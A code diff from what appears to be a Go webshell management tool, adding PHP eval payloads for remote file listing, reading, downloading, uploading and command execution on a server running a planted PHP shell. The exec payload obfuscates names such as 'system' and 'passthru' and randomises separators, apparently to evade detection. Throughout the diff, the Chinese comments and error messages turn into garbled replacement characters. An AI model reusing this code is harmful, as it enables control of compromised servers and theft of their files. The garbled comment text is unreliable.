@@ -9,23 +9,23 @@ import (
 	"github.com/Yliken/redbeanshellcore/core"
 )
 
-// phpInfo 是 Info 操作的 PHP 适配器版本。
+// phpInfo �� Info ������ PHP �������汾��
 //
-//	core 的 ops.InfoOperation 只能生成一个字面 payload，对 PHP Shell 不够用——
-//	PHP Shell 实际上要 eval 一段 PHP 代码才能拿到系统信息。
-//	这里用 PHPTemplates 生成真正能执行的源码并写入 payload。
+//	core �� ops.InfoOperation ֻ������һ������ payload���� PHP Shell �����á���
+//	PHP Shell ʵ����Ҫ eval һ�� PHP ��������õ�ϵͳ��Ϣ��
+//	������ PHPTemplates ����������ִ�е�Դ�벢д�� payload��
 type phpInfo struct {
 	tpl *PHPTemplates
 }
 
-// NewPhpInfo 构建一个 PHP 兼容的 Info 操作。
+// NewPhpInfo ����һ�� PHP ���ݵ� Info ������
 func NewPhpInfo() *phpInfo { return &phpInfo{tpl: NewPHPTemplates()} }
 
 func (p *phpInfo) Name() string { return "info" }
 
 func (p *phpInfo) RiskLevel() core.RiskLevel { return core.RiskReadOnly }
 
-// Build 填入从模板渲染出来的真实 PHP 源码。
+// Build �����ģ����Ⱦ��������ʵ PHP Դ�롣
 func (p *phpInfo) Build(_ context.Context, sess *core.Session) (*core.Request, error) {
 	req := core.NewRequest(p.Name())
 	code, _ := p.tpl.Info()
@@ -37,18 +37,18 @@ func (p *phpInfo) Build(_ context.Context, sess *core.Session) (*core.Request, e
 
 func (p *phpInfo) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
 	if resp == nil {
-		return nil, errors.New("phpInfo.Parse: 响应为空")
+		return nil, errors.New("phpInfo.Parse: ��ӦΪ��")
 	}
 	return parseInfo(string(resp.Body), resp.Body), nil
 }
 
-// phpFileList 是 FileList 操作的 PHP 适配器版本。
+// phpFileList �� FileList ������ PHP �������汾��
 type phpFileList struct {
 	tpl    *PHPTemplates
 	target string
 }
 
-// NewPhpFileList 构建一个 FileList 操作。
+// NewPhpFileList ����һ�� FileList ������
 func NewPhpFileList(path string) *phpFileList {
 	if path == "" {
 		path = "/"
@@ -71,7 +71,7 @@ func (p *phpFileList) Build(_ context.Context, _ *core.Session) (*core.Request, 
 
 func (p *phpFileList) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
 	if resp == nil {
-		return nil, errors.New("phpFileList.Parse: 响应为空")
+		return nil, errors.New("phpFileList.Parse: ��ӦΪ��")
 	}
 	if err := parseRemoteError(p.Name(), resp); err != nil {
 		return nil, err
@@ -79,13 +79,13 @@ func (p *phpFileList) Parse(_ context.Context, resp *core.Response) (core.Result
 	return parseFileList(p.target, resp.Body), nil
 }
 
-// phpFileRead 是 FileRead 操作的 PHP 适配器版本。
+// phpFileRead �� FileRead ������ PHP �������汾��
 type phpFileRead struct {
 	tpl    *PHPTemplates
 	target string
 }
 
-// NewPhpFileRead 构建一个 FileRead 操作。
+// NewPhpFileRead ����һ�� FileRead ������
 func NewPhpFileRead(path string) *phpFileRead {
 	return &phpFileRead{tpl: NewPHPTemplates(), target: path}
 }
@@ -105,7 +105,7 @@ func (p *phpFileRead) Build(_ context.Context, _ *core.Session) (*core.Request, 
 
 func (p *phpFileRead) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
 	if resp == nil {
-		return nil, errors.New("phpFileRead.Parse: 响应为空")
+		return nil, errors.New("phpFileRead.Parse: ��ӦΪ��")
 	}
 	if err := parseRemoteError(p.Name(), resp); err != nil {
 		return nil, err
@@ -113,13 +113,13 @@ func (p *phpFileRead) Parse(_ context.Context, resp *core.Response) (core.Result
 	return parseFileRead(p.Name(), p.target, resp.Body), nil
 }
 
-// phpFileDownload 是 FileDownload 操作的 PHP 适配器版本。
+// phpFileDownload �� FileDownload ������ PHP �������汾��
 type phpFileDownload struct {
 	tpl    *PHPTemplates
 	target string
 }
 
-// NewPhpFileDownload 构建一个二进制安全的 PHP FileDownload 操作。
+// NewPhpFileDownload ����һ�������ư�ȫ�� PHP FileDownload ������
 func NewPhpFileDownload(path string) *phpFileDownload {
 	return &phpFileDownload{tpl: NewPHPTemplates(), target: path}
 }
@@ -139,7 +139,7 @@ func (p *phpFileDownload) Build(_ context.Context, _ *core.Session) (*core.Reque
 
 func (p *phpFileDownload) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
 	if resp == nil {
-		return nil, errors.New("phpFileDownload.Parse: 响应为空")
+		return nil, errors.New("phpFileDownload.Parse: ��ӦΪ��")
 	}
 	if err := parseRemoteError(p.Name(), resp); err != nil {
 		return nil, err
@@ -147,9 +147,9 @@ func (p *phpFileDownload) Parse(_ context.Context, resp *core.Response) (core.Re
 	return parseFileRead(p.Name(), p.target, resp.Body), nil
 }
 
-// phpFileUpload 是 FileUpload 操作的 PHP 适配器版本。
-// 用自包含方案把 remote_path 和 file_content 都 base64 内联进 PHP 源码里，
-// 这样远端 eval 即可写出文件，不依赖任何外部 POST 字段。
+// phpFileUpload �� FileUpload ������ PHP �������汾��
+// ���԰��������� remote_path �� file_content �� base64 ������ PHP Դ���
+// ����Զ�� eval ����д���ļ����������κ��ⲿ POST �ֶΡ�
 type phpFileUpload struct {
 	tpl     *PHPTemplates
 	remote  string
@@ -157,7 +157,7 @@ type phpFileUpload struct {
 	append  bool
 }
 
-// NewPhpFileUpload 构建一个 PHP 兼容的 FileUpload 操作。
+// NewPhpFileUpload ����һ�� PHP ���ݵ� FileUpload ������
 func NewPhpFileUpload(remotePath string, content []byte) *phpFileUpload {
 	return &phpFileUpload{
 		tpl:     NewPHPTemplates(),
@@ -171,7 +171,7 @@ func (p *phpFileUpload) Name() string { return "file.upload" }
 
 func (p *phpFileUpload) RiskLevel() core.RiskLevel { return core.RiskWrite }
 
-// WithAppend 切换为追加模式（默认覆盖）。
+// WithAppend �л�Ϊ׷��ģʽ��Ĭ�ϸ��ǣ���
 func (p *phpFileUpload) WithAppend(on bool) *phpFileUpload {
 	p.append = on
 	return p
@@ -183,7 +183,7 @@ func (p *phpFileUpload) Build(_ context.Context, _ *core.Session) (*core.Request
 	remoteB64 := b64(p.remote)
 	contentB64 := b64(string(p.content))
 
-	// 自包含 PHP 源码：把路径和内容都 base64 内联，eval 即可写出文件。
+	// �԰��� PHP Դ�룺��·�������ݶ� base64 ������eval ����д���ļ���
 	flag := "w"
 	if p.append {
 		flag = "a"
@@ -196,9 +196,9 @@ func (p *phpFileUpload) Build(_ context.Context, _ *core.Session) (*core.Request
 		"if($f===false){echo \"0\";exit;}" +
 		"$n=@fwrite($f,$c);" +
 		"@fclose($f);" +
-		"if($n===false){echo \"0\";}else{echo \"1\";}"
+		"if($n===false||$n!==strlen($c)){echo \"0\";}else{echo \"1\";}"
 
-	_ = p.tpl // 保留引用避免 unused
+	_ = p.tpl // �������ñ��� unused
 
 	req.Payload = []byte(code)
 	req.Meta["adapter"] = "php"
@@ -207,7 +207,7 @@ func (p *phpFileUpload) Build(_ context.Context, _ *core.Session) (*core.Request
 
 func (p *phpFileUpload) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
 	if resp == nil {
-		return nil, errors.New("phpFileUpload.Parse: 响应为空")
+		return nil, errors.New("phpFileUpload.Parse: ��ӦΪ��")
 	}
 	trimmed := string(resp.Body)
 	ok := trimmed == "1" || trimmed == "ok"
@@ -218,7 +218,7 @@ func (p *phpFileUpload) Parse(_ context.Context, resp *core.Response) (core.Resu
 	}, nil
 }
 
-// phpExec 是 Exec 操作的 PHP 适配器版本。
+// phpExec �� Exec ������ PHP �������汾��
 type phpExec struct {
 	tpl    *PHPTemplates
 	cmd    string
@@ -226,7 +226,7 @@ type phpExec struct {
 	envars map[string]string
 }
 
-// NewPhpExec 创建一个 PHP 兼容的 Exec 操作。
+// NewPhpExec ����һ�� PHP ���ݵ� Exec ������
 func NewPhpExec(cmd string) *phpExec {
 	return &phpExec{tpl: NewPHPTemplates(), cmd: cmd, bin: "/bin/sh"}
 }
@@ -238,15 +238,15 @@ func (p *phpExec) RiskLevel() core.RiskLevel { return core.RiskExec }
 func (p *phpExec) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
 	req := core.NewRequest(p.Name())
 
-	// 自包含方案：直接把参数值 base64 编码后内联到 PHP 源码里，
-	// 替换 $_POST['xxx'] 为字面量 base64 字符串。
-	// 这样 PHP 源码不依赖任何外部 POST 字段，eval 即可执行。
+	// �԰���������ֱ�ӰѲ���ֵ base64 ����������� PHP Դ���
+	// �滻 $_POST['xxx'] Ϊ������ base64 �ַ�����
+	// ���� PHP Դ�벻�����κ��ⲿ POST �ֶΣ�eval ����ִ�С�
 	binB64 := b64(p.bin)
 	cmdB64 := b64(p.cmd)
 
 
 
-	// 使用随机分隔符替代固定的 |||askey||| / |||asline|||
+	// ʹ������ָ�������̶��� |||askey||| / |||asline|||
 	seps := NewSeparators()
 
 	var envStr string
@@ -259,8 +259,8 @@ func (p *phpExec) Build(_ context.Context, _ *core.Session) (*core.Request, erro
 	}
 		envB64 := b64(envStr)
 
-	// 构造自包含 PHP 源码：把 base64_decode($_POST['xxx']) 替换成
-	// base64_decode('xxx')，让 eval 直接拿到解码后的值。
+	// �����԰��� PHP Դ�룺�� base64_decode($_POST['xxx']) �滻��
+	// base64_decode('xxx')���� eval ֱ���õ�������ֵ��
 	b64S, b64R := obfuscatedFuncSubstr("base64_decode")
 	sysS, sysR := obfuscatedFuncSubstr("system")
 	psS, psR := obfuscatedFuncSubstr("passthru")
@@ -292,26 +292,26 @@ func (p *phpExec) Build(_ context.Context, _ *core.Session) (*core.Request, erro
 		"elseif(fe(" + seR + ")){print(@" + seR + "($c));}" +
 		"elseif(fe(" + exR + ")){@" + exR + "($c,$o,$ret);print(join(\"\\n\",$o));}" +
 		"elseif(fe(" + poR + ")){$fp=@" + poR + "($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}" +
-		"elseif(fe(" + prR + ")){$p=@" + prR + "($c,array(1=>array('pipe','w'),2=>array('pipe','w')),$io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}$ret=0;@fclose($io[1]);@fclose($io[2]);@proc_close($p);}" +
+		"elseif(fe(" + prR + ")){$p=@" + prR + "($c,array(1=>array('pipe','w'),2=>array('pipe','w')),$io);@stream_set_blocking($io[1],0);@stream_set_blocking($io[2],0);$ox='';$ey='';while(!@feof($io[1])||!@feof($io[2])){$r=array($io[1],$io[2]);$w=null;$x=null;if(@stream_select($r,$w,$x,null)){if(in_array($io[1],$r))$ox.=@fread($io[1],8192);if(in_array($io[2],$r))$ey.=@fread($io[2],8192);}}@fclose($io[1]);@fclose($io[2]);@proc_close($p);echo $ox;if($ey!=''){echo 'STDERR:'.$ey;}$ret=0;}" +
 		"else{$ret=127;}" +
 		"return $ret;}" +
-		"$ret=@runcmd($r . ' 2>&1');" +
+		"$ret=@runcmd($r);" +
 		"if($ret!=0){echo 'ret=' . $ret;}"
 
-	_ = p.tpl // 保留引用避免 unused
+	_ = p.tpl // �������ñ��� unused
 
 	req.Payload = []byte(code)
 	req.Meta["adapter"] = "php"
 	return req, nil
 }
 
-// WithBin 指定非默认 shell 路径（例如 C:\Windows\system32\cmd.exe）。
+// WithBin ָ����Ĭ�� shell ·�������� C:\Windows\system32\cmd.exe����
 func (p *phpExec) WithBin(bin string) *phpExec {
 	p.bin = bin
 	return p
 }
 
-// WithEnv 追加注入的环境变量。
+// WithEnv ׷��ע��Ļ���������
 func (p *phpExec) WithEnv(key, value string) *phpExec {
 	if p.envars == nil {
 		p.envars = make(map[string]string)
@@ -322,12 +322,12 @@ func (p *phpExec) WithEnv(key, value string) *phpExec {
 
 func (p *phpExec) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
 	if resp == nil {
-		return nil, errors.New("phpExec.Parse: 响应为空")
+		return nil, errors.New("phpExec.Parse: ��ӦΪ��")
 	}
 	return parseExec(resp.Body), nil
 }
 
-// 下面是各种操作的解析逻辑。
+// �����Ǹ��ֲ����Ľ����߼���
 
 func parseInfo(raw string, body []byte) core.Result {
 	parts := splitTab(raw)
@@ -335,7 +335,7 @@ func parseInfo(raw string, body []byte) core.Result {
 	switch {
 	case len(parts) >= 4:
 		res.Workdir = parts[0]
-		// parts[1] 是驱动器列表，已包含在 Raw 里
+		// parts[1] ���������б����Ѱ����� Raw ��
 		res.OS = parts[2]
 		res.User = parts[3]
 	case len(parts) >= 1:
@@ -388,22 +388,22 @@ func parseExec(body []byte) core.Result {
 		BaseResult: core.NewBaseResult("exec", body),
 		Stdout:     string(body),
 	}
-	// 远端模板在非零退出码时会尾部追加 "ret=<n>"，解析出来填入 ExitCode。
-	//   注意 stderr 已通过 2>&1 合并到 stdout，这里只提取退出码。
+	// Զ��ģ���ڷ����˳���ʱ��β��׷�� "ret=<n>"�������������� ExitCode��
+	//   ע�� stderr ��ͨ�� 2>&1 �ϲ��� stdout������ֻ��ȡ�˳��롣
 	const prefix = "ret="
 	s := string(body)
 	if idx := strings.LastIndex(s, prefix); idx >= 0 {
 		codeStr := strings.TrimSpace(s[idx+len(prefix):])
 		if code, err := strconv.Atoi(codeStr); err == nil {
 			out.ExitCode = code
-			// 从 Stdout 中去掉尾部 ret=<n>，保持输出干净。
+			// �� Stdout ��ȥ��β�� ret=<n>����������ɾ���
 			out.Stdout = strings.TrimSpace(s[:idx])
 		}
 	}
 	return out
 }
 
-// 工具函数（为了自包含写了少量辅助函数）。
+// ���ߺ�����Ϊ���԰���д������������������
 
 func splitTab(s string) []string {
 	var out []string
